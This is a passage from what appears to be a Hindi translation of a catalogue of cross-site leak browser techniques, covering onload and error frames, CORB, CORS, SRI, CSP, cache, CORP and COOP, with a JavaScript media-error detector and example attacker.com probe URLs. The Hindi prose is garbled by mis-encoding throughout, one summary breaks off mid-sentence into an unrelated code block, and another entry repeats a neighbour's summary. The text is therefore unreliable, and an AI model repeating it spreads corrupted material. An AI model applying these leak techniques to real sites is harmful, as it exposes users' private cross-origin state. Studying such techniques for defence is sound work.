рд╕рдВрд╕рд╛рдзрдиреЛрдВ рдХреЗ рд▓реЛрдб рд╣реЛрдиреЗ рдХреЗ рдмрд╛рдж рдФрд░ рд╕рднреА рдЬрд╛рд╡рд╛рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЗ рдкреВрд░рд╛ рд╣реЛрдиреЗ рдХреЗ рдмрд╛рдж рдЖрдордВрддреНрд░рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рд▓реЗрдХрд┐рди, рдПрдХ attacker `<iframe>` рдореЗрдВ [`sandbox`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe) рд╡рд┐рд╢реЗрд╖рддрд╛ рдХреЛ рд╢рд╛рдорд┐рд▓ рдХрд░рдХреЗ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдирд┐рд╖реНрдкрд╛рджрди рдХреЗ рд╢реЛрд░ рдХреЛ рд╕рдорд╛рдкреНрдд рдХрд░ рд╕рдХрддрд╛ рд╣реИред рдпрд╣ рд╡рд┐рд╢реЗрд╖рддрд╛ рдЬрд╛рд╡рд╛рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдирд┐рд╖реНрдкрд╛рджрди рд╕рд╣рд┐рдд рдХрдИ рд╡рд┐рд╢реЗрд╖рддрд╛рдУрдВ рдХреЛ рдЕрд╡рд░реБрджреНрдз рдХрд░рддреА рд╣реИ, рдЬрд┐рд╕рдХреЗ рдкрд░рд┐рдгрд╛рдорд╕реНрд╡рд░реВрдк рд▓рдЧрднрдЧ рд╢реБрджреНрдз рдиреЗрдЯрд╡рд░реНрдХ рдорд╛рдк рд╣реЛрддрд╛ рд╣реИред

### #ID + error + onload

* **Inclusion Methods**: Frames
* **Detectable Difference**: Page Content
* **рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА**:
* **рд╕рд╛рд░рд╛рдВрд╢**: рдпрджрд┐ рдЖрдк рдкреГрд╖реНрда рдХреЛ рддреНрд░реБрдЯрд┐ рдХреЗ рд╕рд╛рде рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ рдЬрдм рд╕рд╣реА рд╕рд╛рдордЧреНрд░реА рддрдХ рдкрд╣реБрдБрдЪрд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ рдЗрд╕реЗ рд╕рд╣реА рдврдВрдЧ рд╕реЗ рд▓реЛрдб рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬрдм рдХреЛрдИ рднреА рд╕рд╛рдордЧреНрд░реА рддрдХ рдкрд╣реБрдБрдЪрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рдЖрдк рд╕рдордп рдХреЛ рдорд╛рдкреЗ рдмрд┐рдирд╛ рд╕рднреА рдЬрд╛рдирдХрд╛рд░реА рдХреЛ рдирд┐рдХрд╛рд▓рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рд▓реВрдк рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВред
* **рдХреЛрдб рдЙрджрд╛рд╣рд░рдг**:

рдорд╛рди рд▓реАрдЬрд┐рдП рдХрд┐ рдЖрдк **рдкреГрд╖реНрда** рдХреЛ **рдЕрдВрджрд░ рдПрдХ Iframe** рдореЗрдВ **рдбрд╛рд▓** рд╕рдХрддреЗ рд╣реИрдВ рдЬрд┐рд╕рдореЗрдВ **рдЧреБрдкреНрдд** рд╕рд╛рдордЧреНрд░реА рд╣реИред

рдЖрдк **рдкреАрдбрд╝рд┐рдд рдХреЛ рдЦреЛрдЬ** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд┐рд╕рдореЗрдВ "_**flag**_" рд╢рд╛рдорд┐рд▓ рд╣реИ рдПрдХ **Iframe** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ (рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП CSRF рдХрд╛ рд╢реЛрд╖рдг рдХрд░рддреЗ рд╣реБрдП)ред Iframe рдХреЗ рдЕрдВрджрд░ рдЖрдк рдЬрд╛рдирддреЗ рд╣реИрдВ рдХрд┐ _**onload event**_ рд╣рдореЗрд╢рд╛ рдХрдо рд╕реЗ рдХрдо рдПрдХ рдмрд╛рд░ **рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛**ред рдлрд┐рд░, рдЖрдк **URL** рдХреЛ **рдмрджрд▓** рд╕рдХрддреЗ рд╣реИрдВ **iframe** рдХрд╛ рд▓реЗрдХрд┐рди рдХреЗрд╡рд▓ URL рдХреЗ **hash** рдХреЗ **рд╕рд╛рдордЧреНрд░реА** рдХреЛ рдмрджрд▓рдХрд░ред

рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП:

1. **URL1**: www.attacker.com/xssearch#try1
2. **URL2**: www.attacker.com/xssearch#try2

рдпрджрд┐ рдкрд╣рд▓рд╛ URL **рд╕рдлрд▓рддрд╛рдкреВрд░реНрд╡рдХ рд▓реЛрдб рдХрд┐рдпрд╛ рдЧрдпрд╛** рдерд╛, рддреЛ, рдЬрдм **hash** рдХрд╛ рд╣рд┐рд╕реНрд╕рд╛ URL рдХреЛ **рдмрджрд▓рддреЗ** рд╣реИрдВ рддреЛ **onload** рдШрдЯрдирд╛ **рдлрд┐рд░ рд╕реЗ рдЯреНрд░рд┐рдЧрд░ рдирд╣реАрдВ рд╣реЛрдЧреА**ред рд▓реЗрдХрд┐рди **рдпрджрд┐** рдкреГрд╖реНрда рдореЗрдВ рдХрд┐рд╕реА рдкреНрд░рдХрд╛рд░ рдХреА **рддреНрд░реБрдЯрд┐** рдереА рдЬрдм **рд▓реЛрдбрд┐рдВрдЧ**, рддреЛ, **onload** рдШрдЯрдирд╛ **рдлрд┐рд░ рд╕реЗ рдЯреНрд░рд┐рдЧрд░ рд╣реЛрдЧреА**ред

рдлрд┐рд░, рдЖрдк **рднреЗрдж рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ** рдПрдХ **рд╕рд╣реА рдврдВрдЧ рд╕реЗ** рд▓реЛрдб рдХрд┐рдП рдЧрдП рдкреГрд╖реНрда рдпрд╛ рдкреГрд╖реНрда рдХреЗ рдмреАрдЪ рдЬрд┐рд╕рдореЗрдВ рдПрдХ **рддреНрд░реБрдЯрд┐** рд╣реИ рдЬрдм рдЗрд╕реЗ рдПрдХреНрд╕реЗрд╕ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

### Javascript Execution

* **Inclusion Methods**: Frames
* **Detectable Difference**: Page Content
* **рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА**:
* **рд╕рд╛рд░рд╛рдВрд╢:** рдпрджрд┐ **рдкреГрд╖реНрда** **рд╕рдВрд╡реЗрджрдирд╢реАрд▓** рд╕рд╛рдордЧреНрд░реА **рд╡рд╛рдкрд╕ рдХрд░ рд░рд╣рд╛ рд╣реИ**, **рдпрд╛** рдПрдХ **рд╕рд╛рдордЧреНрд░реА** рдЬрд┐рд╕реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рджреНрд╡рд╛рд░рд╛ **рдирд┐рдпрдВрддреНрд░рд┐рдд** рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ **рдирдХрд╛рд░рд╛рддреНрдордХ рдорд╛рдорд▓реЗ рдореЗрдВ рдорд╛рдиреНрдп JS рдХреЛрдб рд╕реЗрдЯ рдХрд░ рд╕рдХрддрд╛ рд╣реИ**, рдФрд░ **рдкреНрд░рддреНрдпреЗрдХ рдкреНрд░рдпрд╛рд╕ рдХреЛ `<script>` рдЯреИрдЧ рдХреЗ рдЕрдВрджрд░ рд▓реЛрдб рдХрд░ рд╕рдХрддрд╛ рд╣реИ**, рдЗрд╕рд▓рд┐рдП **рдирдХрд╛рд░рд╛рддреНрдордХ** рдорд╛рдорд▓реЛрдВ рдореЗрдВ attackers **рдХреЛрдб** **рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛,** рдФрд░ **рд╕рдХрд╛рд░рд╛рддреНрдордХ** рдорд╛рдорд▓реЛрдВ рдореЗрдВ **рдХреБрдЫ рднреА** рдирд╣реАрдВ рд╣реЛрдЧрд╛ред
* **рдХреЛрдб рдЙрджрд╛рд╣рд░рдг**:

{% content-ref url="xs-search/javascript-execution-xs-leak.md" %}
[javascript-execution-xs-leak.md](xs-search/javascript-execution-xs-leak.md)
{% endcontent-ref %}

### CORB - Onerror

* **Inclusion Methods**: HTML Elements
* **Detectable Difference**: Status Code & Headers
* **рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА**: [https://xsleaks.dev/docs/attacks/browser-features/corb/](https://xsleaks.dev/docs/attacks/browser-features/corb/)
* **рд╕рд╛рд░рд╛рдВрд╢**: Attackers рдпрд╣ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ CORB рд▓рд╛рдЧреВ рд╣реЛрддрд╛ рд╣реИ рдпрд╛ рдирд╣реАрдВ рдпрджрд┐ рдХреЛрдИ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ _CORB рд╕рдВрд░рдХреНрд╖рд┐рдд_ `Content-Type` (рдФрд░ `nosniff`) рдХреЗ рд╕рд╛рде `2xx` рд╕реНрдерд┐рддрд┐ рдХреЛрдб рд╡рд╛рдкрд╕ рдХрд░рддреА рд╣реИ рдЬрд┐рд╕рдХреЗ рдкрд░рд┐рдгрд╛рдорд╕реНрд╡рд░реВрдк CORB рд╢рд░реАрд░ рдФрд░ рд╣реЗрдбрд░реНрд╕ рдХреЛ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рд╕реЗ рд╣рдЯрд╛ рджреЗрддрд╛ рд╣реИред рдЗрд╕ рд╕рдВрд░рдХреНрд╖рдг рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рд╕реЗ рдПрдХ attacker рдХреЛ **leak** рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдорд┐рд▓рддреА рд╣реИ рджреЛрдиреЛрдВ рдХрд╛ рд╕рдВрдпреЛрдЬрди **рд╕реНрдерд┐рддрд┐ рдХреЛрдб** (рд╕
```javascript
// Code saved here in case it dissapear from the link
// Based on MDN MediaError example: https://mdn.github.io/dom-examples/media/mediaerror/
window.addEventListener("load", startup, false);
function displayErrorMessage(msg) {
document.getElementById("log").innerHTML += msg;
}

function startup() {
let audioElement = document.getElementById("audio");
// "https://mdn.github.io/dom-examples/media/mediaerror/assets/good.mp3";
document.getElementById("startTest").addEventListener("click", function() {
audioElement.src = document.getElementById("testUrl").value;
}, false);
// Create the event handler
var errHandler = function() {
let err = this.error;
let message = err.message;
let status = "";

// Chrome error.message when the request loads successfully: "DEMUXER_ERROR_COULD_NOT_OPEN: FFmpegDemuxer: open context failed"
// Firefox error.message when the request loads successfully: "Failed to init decoder"
if((message.indexOf("DEMUXER_ERROR_COULD_NOT_OPEN") != -1) || (message.indexOf("Failed to init decoder") != -1)){
status = "Success";
}else{
status = "Error";
}
displayErrorMessage("<strong>Status: " + status + "</strong> (Error code:" + err.code + " / Error Message: " + err.message + ")<br>");
};
audioElement.onerror = errHandler;
}
```
### CORS рддреНрд░реБрдЯрд┐

* **рд╢рд╛рдорд┐рд▓ рдХрд░рдиреЗ рдХреА рд╡рд┐рдзрд┐рдпрд╛рдБ**: Fetch API
* **рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдпреЛрдЧреНрдп рдЕрдВрддрд░**: рд╣реИрдбрд░
* **рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.3)
* **рд╕рд╛рд░рд╛рдВрд╢:** SA CORS рддреНрд░реБрдЯрд┐ рд╕рдВрджреЗрд╢ рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рд┐рдд рдХреЗ рдкреВрд░реНрдг URL рдХреЛ рд▓реАрдХ рдХрд░рддреЗ рд╣реИрдВред
* **рдХреЛрдб рдЙрджрд╛рд╣рд░рдг**: [https://xsinator.com/testing.html#CORS%20Error%20Leak](https://xsinator.com/testing.html#CORS%20Error%20Leak)

рдпрд╣ рддрдХрдиреАрдХ рд╣рдорд▓рд╛рд╡рд░ рдХреЛ рдПрдХ рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рд┐рдд рдХреЗ рд▓рдХреНрд╖реНрдп рдХреЛ рд▓реАрдХ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИ рдЬреЛ рдХрд┐ рдПрдХ рдХреНрд░реЙрд╕-рдУрд░рд┐рдЬрд┐рди рд╕рд╛рдЗрдЯ рджреНрд╡рд╛рд░рд╛ рдкреНрд░рд╛рд░рдВрдн рдХреА рдЧрдИ рд╣реИред

CORS рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рд░реВрдк рд╕реЗ рд╕реБрд▓рдн рд╡реЗрдм рд╕рдВрд╕рд╛рдзрдиреЛрдВ рдХреЛ рдХрд┐рд╕реА рднреА рд╡реЗрдмрд╕рд╛рдЗрдЯ рд╕реЗ рдкрдврд╝рдиреЗ рдФрд░ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред Webkit-рдЖрдзрд╛рд░рд┐рдд рдмреНрд░рд╛рдЙрдЬрд╝рд░реЛрдВ рдореЗрдВ, рдЬрдм рдПрдХ CORS рдЕрдиреБрд░реЛрдз рд╡рд┐рдлрд▓ рд╣реЛрддрд╛ рд╣реИ рддреЛ CORS рддреНрд░реБрдЯрд┐ рд╕рдВрджреЗрд╢реЛрдВ рддрдХ рдкрд╣реБрдБрдЪрдирд╛ рд╕рдВрднрд╡ рд╣реИред рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдПрдХ рд▓рдХреНрд╖реНрдп рд╡реЗрдмрд╕рд╛рдЗрдЯ рдкрд░ рдПрдХ CORS-рд╕рдХреНрд╖рдо рдЕрдиреБрд░реЛрдз рднреЗрдЬ рд╕рдХрддрд╛ рд╣реИ рдЬреЛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреА рд╕реНрдерд┐рддрд┐ рдХреЗ рдЖрдзрд╛рд░ рдкрд░ рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рд┐рдд рдХрд░рддрд╛ рд╣реИред рдЬрдм рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдЕрдиреБрд░реЛрдз рдХреЛ рдЕрд╕реНрд╡реАрдХрд╛рд░ рдХрд░рддрд╛ рд╣реИ, рддреЛ рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рд┐рдд рд▓рдХреНрд╖реНрдп рдХрд╛ рдкреВрд░реНрдг URL рддреНрд░реБрдЯрд┐ рд╕рдВрджреЗрд╢ рдореЗрдВ рд▓реАрдХ рд╣реЛ рдЬрд╛рддрд╛ рд╣реИред рдЗрд╕ рд╣рдорд▓реЗ рдХреЗ рд╕рд╛рде, рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рд┐рдд рд╕реНрдерд╛рдиреЛрдВ рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдирд╛, рд▓реАрдХ рдХрд░рдирд╛ рдФрд░ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдХреНрд╡реЗрд░реА рдкреИрд░рд╛рдореАрдЯрд░реНрд╕ рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдирд╛ рд╕рдВрднрд╡ рд╣реИред

### SRI рддреНрд░реБрдЯрд┐

* **рд╢рд╛рдорд┐рд▓ рдХрд░рдиреЗ рдХреА рд╡рд┐рдзрд┐рдпрд╛рдБ**: Fetch API
* **рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдпреЛрдЧреНрдп рдЕрдВрддрд░**: рд╣реИрдбрд░
* **рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.3)
* **рд╕рд╛рд░рд╛рдВрд╢:** SA CORS рддреНрд░реБрдЯрд┐ рд╕рдВрджреЗрд╢ рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рд┐рдд рдХреЗ рдкреВрд░реНрдг URL рдХреЛ рд▓реАрдХ рдХрд░рддреЗ рд╣реИрдВред
* **рдХреЛрдб рдЙрджрд╛рд╣рд░рдг**: [https://xsinator.com/testing.html#SRI%20Error%20Leak](https://xsinator.com/testing.html#SRI%20Error%20Leak)

рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рд╡рд┐рд╕реНрддреГрдд рддреНрд░реБрдЯрд┐ рд╕рдВрджреЗрд╢реЛрдВ рдХреЗ рдХрд╛рд░рдг рдХреНрд░реЙрд╕-рдУрд░рд┐рдЬрд┐рди рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛рдУрдВ рдХреЗ рдЖрдХрд╛рд░ рдХреЛ рд▓реАрдХ рдХрд░ рд╕рдХрддрд╛ рд╣реИред

### CSP рдЙрд▓реНрд▓рдВрдШрди/рдкрддрд╛ рд▓рдЧрд╛рдирд╛

* **рд╢рд╛рдорд┐рд▓ рдХрд░рдиреЗ рдХреА рд╡рд┐рдзрд┐рдпрд╛рдБ**: рдкреЙрдк-рдЕрдкреНрд╕
* **рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдпреЛрдЧреНрдп рдЕрдВрддрд░**: рд╕реНрдЯреЗрдЯрд╕ рдХреЛрдб
* **рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА**: [https://bugs.chromium.org/p/chromium/issues/detail?id=313737](https://bugs.chromium.org/p/chromium/issues/detail?id=313737), [https://lists.w3.org/Archives/Public/public-webappsec/2013May/0022.html](https://lists.w3.org/Archives/Public/public-webappsec/2013May/0022.html), [https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects](https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects)
* **рд╕рд╛рд░рд╛рдВрд╢:** рдХреЗрд╡рд▓ рдкреАрдбрд╝рд┐рдд рдХреА рд╡реЗрдмрд╕рд╛рдЗрдЯ рдХреЛ CSP рдореЗрдВ рдЕрдиреБрдорддрд┐ рджреЗрдиреЗ рдкрд░, рдпрджрд┐ рд╣рдордиреЗ рдЗрд╕реЗ рдПрдХреНрд╕реЗрд╕ рдХрд┐рдпрд╛ рдФрд░ рдпрд╣ рдПрдХ рдЕрд▓рдЧ рдбреЛрдореЗрди рдкрд░ рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░рддрд╛ рд╣реИ, рддреЛ CSP рдПрдХ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдпреЛрдЧреНрдп рддреНрд░реБрдЯрд┐ рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд░реЗрдЧрд╛ред
* **рдХреЛрдб рдЙрджрд╛рд╣рд░рдг**: [https://xsinator.com/testing.html#CSP%20Violation%20Leak](https://xsinator.com/testing.html#CSP%20Violation%20Leak), [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#intended-solution-csp-violation](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#intended-solution-csp-violation)

### рдХреИрд╢

* **рд╢рд╛рдорд┐рд▓ рдХрд░рдиреЗ рдХреА рд╡рд┐рдзрд┐рдпрд╛рдБ**: рдлреНрд░реЗрдореНрд╕, рдкреЙрдк-рдЕрдкреНрд╕
* **рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдпреЛрдЧреНрдп рдЕрдВрддрд░**: рдкреЗрдЬ рд╕рд╛рдордЧреНрд░реА
* **рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА**: [https://xsleaks.dev/docs/attacks/cache-probing/#cache-probing-with-error-events](https://xsleaks.dev/docs/attacks/cache-probing/#cache-probing-with-error-events), [https://sirdarckcat.blogspot.com/2019/03/http-cache-cross-site-leaks.html](https://sirdarckcat.blogspot.com/2019/03/http-cache-cross-site-leaks.html)
* **рд╕рд╛рд░рд╛рдВрд╢:** рдХреИрд╢ рд╕реЗ рдлрд╛рдЗрд▓ рдХреЛ рд╕рд╛рдл рдХрд░реЗрдВред рд▓рдХреНрд╖реНрдп рдкреГрд╖реНрда рдЦреЛрд▓реЗрдВ рдФрд░ рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ рдХреНрдпрд╛ рдлрд╛рдЗрд▓ рдХреИрд╢ рдореЗрдВ рдореМрдЬреВрдж рд╣реИред
* **рдХреЛрдб рдЙрджрд╛рд╣рд░рдг:**

### CSP рдирд┐рд░реНрджреЗрд╢

* **рд╢рд╛рдорд┐рд▓ рдХрд░рдиреЗ рдХреА рд╡рд┐рдзрд┐рдпрд╛рдБ**: рдлреНрд░реЗрдореНрд╕
* **рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдпреЛрдЧреНрдп рдЕрдВрддрд░**: рд╣реИрдбрд░
* **рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА**: [https://bugs.chromium.org/p/chromium/issues/detail?id=1105875](https://bugs.chromium.org/p/chromium/issues/detail?id=1105875)
* **рд╕рд╛рд░рд╛рдВрд╢:** CSP рд╣реИрдбрд░ рдирд┐рд░реНрджреЗрд╢реЛрдВ рдХреЛ CSP iframe рд╡рд┐рд╢реЗрд╖рддрд╛ рдХреЗ рд╕рд╛рде рдЬрд╛рдВрдЪрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред
* **рдХреЛрдб рдЙрджрд╛рд╣рд░рдг**: [https://xsinator.com/testing.html#CSP%20Directive%20Leak](https://xsinator.com/testing.html#CSP%20Directive%20Leak)

### **CORP**

* **рд╢рд╛рдорд┐рд▓ рдХрд░рдиреЗ рдХреА рд╡рд┐рдзрд┐рдпрд╛рдБ**: Fetch API
* **рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдпреЛрдЧреНрдп рдЕрдВрддрд░**: рд╣реИрдбрд░
* **рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА**: [**https://xsleaks.dev/docs/attacks/browser-features/corp/**](https://xsleaks.dev/docs/attacks/browser-features/corp/)
* **рд╕рд╛рд░рд╛рдВрд╢:** CORP рд╕реЗ рд╕реБрд░рдХреНрд╖рд┐рдд рд╕рдВрд╕рд╛рдзрди рдЬрдм рдлреЗрдЪ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рддреЛ рддреНрд░реБрдЯрд┐ рдлреЗрдВрдХрддрд╛ рд╣реИред
* **рдХреЛрдб рдЙрджрд╛рд╣рд░рдг**: [https://xsinator.com/testing.html#CORP%20Leak](https://xsinator.com/testing.html#CORP%20Leak)

### CORB

* **рд╢рд╛рдорд┐рд▓ рдХрд░рдиреЗ рдХреА рд╡рд┐рдзрд┐рдпрд╛рдБ**: HTML рддрддреНрд╡
* **рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдпреЛрдЧреНрдп рдЕрдВрддрд░**: рд╣реИрдбрд░реНрд╕
* **рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА**: [https://xsleaks.dev/docs/attacks/browser-features/corb/#detecting-the-nosniff-header](https://xsleaks.dev/docs/attacks/browser-features/corb/#detecting-the-nosniff-header)
* **рд╕рд╛рд░рд╛рдВрд╢**: CORB рд╣рдорд▓рд╛рд╡рд░реЛрдВ рдХреЛ рдпрд╣ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗ рд╕рдХрддрд╛ рд╣реИ рдХрд┐ рдХреНрдпрд╛ `nosniff` рд╣реИрдбрд░ рдЕрдиреБрд░реЛрдз рдореЗрдВ рдореМрдЬреВрдж рд╣реИред
* **рдХреЛрдб рдЙрджрд╛рд╣рд░рдг**: [https://xsinator.com/testing.html#CORB%20Leak](https://xsinator.com/testing.html#CORB%20Leak)

### CORS рддреНрд░реБрдЯрд┐ рдСрди рдУрд░рд┐рдЬрд┐рди рд░рд┐рдлреНрд▓реЗрдХреНрд╢рди рдорд┐рд╕рдХреЙрдиреНрдлрд┐рдЧрд░реЗрд╢рди <a href="#cors-error-on-origin-reflection-misconfiguration" id="cors-error-on-origin-reflection-misconfiguration"></a>

* **рд╢рд╛рдорд┐рд▓ рдХрд░рдиреЗ рдХреА рд╡рд┐рдзрд┐рдпрд╛рдБ**: Fetch API
* **рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдпреЛрдЧреНрдп рдЕрдВрддрд░**: рд╣реИрдбрд░реНрд╕
* **рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА**: [https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration](https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration)
* **рд╕рд╛рд░рд╛рдВрд╢**: рдпрджрд┐ Origin рд╣реИрдбрд░ рдХреЛ рд╣реИрдбрд░ `Access-Control-Allow-Origin` рдореЗрдВ рдкреНрд░рддрд┐рдмрд┐рдВрдмрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рддреЛ рдпрд╣ рд╕рдВрднрд╡ рд╣реИ рдХрд┐ рдпрд╣ рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ рдХреНрдпрд╛ рдХреЛрдИ рд╕рдВрд╕рд╛рдзрди рдкрд╣рд▓реЗ рд╕реЗ рдХреИрд╢ рдореЗрдВ рд╣реИред
* **рдХреЛрдб рдЙрджрд╛рд╣рд░рдг**: [https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration](https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration)

## Readable Attributes Technique

### Fetch Redirect

* **рд╢рд╛рдорд┐рд▓ рдХрд░рдиреЗ рдХреА рд╡рд┐рдзрд┐рдпрд╛рдБ**: Fetch API
* **рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдпреЛрдЧреНрдп рдЕрдВрддрд░**: рд╕реНрдЯреЗрдЯрд╕ рдХреЛрдб
* **рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА**: [https://web-in-security.blogspot.com/2021/02/security-and-privacy-of-social-logins-part3.html](https://web-in-security.blogspot.com/2021/02/security-and-privacy-of-social-logins-part3.html)
* **рд╕рд╛рд░рд╛рдВрд╢:** GC рдФрд░ SA рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рди рд╕рдорд╛рдкреНрдд рд╣реЛрдиреЗ рдХреЗ рдмрд╛рдж рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХреЗ рдкреНрд░рдХрд╛рд░ (opaque-redirect) рдХреА рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреЗ рд╣реИрдВред
* **рдХреЛрдб рдЙрджрд╛рд╣рд░рдг**: [https://xsinator.com/testing.html#Fetch%20Redirect%20Leak](https://xsinator.com/testing.html#Fetch%20Redirect%20Leak)

### COOP

* **рд╢рд╛рдорд┐рд▓ рдХрд░рдиреЗ рдХреА рд╡рд┐рдзрд┐рдпрд╛рдБ**: рдкреЙрдк-рдЕрдкреНрд╕
* **рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдпреЛрдЧреНрдп рдЕрдВрддрд░**: рд╣реИрдбрд░
* **рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.4), [https://xsleaks.dev/docs/attacks/window-references/](https://xsleaks.dev/docs/attacks/window-references/)
* **рд╕рд╛рд░рд╛рдВрд╢:** COOP рд╕реЗ рд╕реБрд░рдХреНрд╖рд┐рдд рдкреГрд╖реНрдареЛрдВ рдХреЛ рдПрдХреНрд╕реЗрд╕ рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ред
* **рдХреЛрдб рдЙрджрд╛рд╣рд░рдг**: [https://xsinator.com/testing.html#COOP%20Leak](https://xsinator.com/testing.html#COOP%20Leak)

### URL рдЕрдзрд┐рдХрддрдо рд▓рдВрдмрд╛рдИ - рд╕рд░реНрд╡рд░ рд╕рд╛рдЗрдб

* **рд╢рд╛рдорд┐рд▓ рдХрд░рдиреЗ рдХреА рд╡рд┐рдзрд┐рдпрд╛рдБ**: Fetch API, HTML рддрддреНрд╡
* **рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдпреЛрдЧреНрдп рдЕрдВрддрд░**: рд╕реНрдЯреЗрдЯрд╕ рдХреЛрдб / рд╕рд╛рдордЧреНрд░реА
* **рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА**: [https://xsleaks.dev/docs/attacks/navigations/#server-side-redirects](https://xsleaks.dev/docs/attacks/navigations/#server-side-redirects)
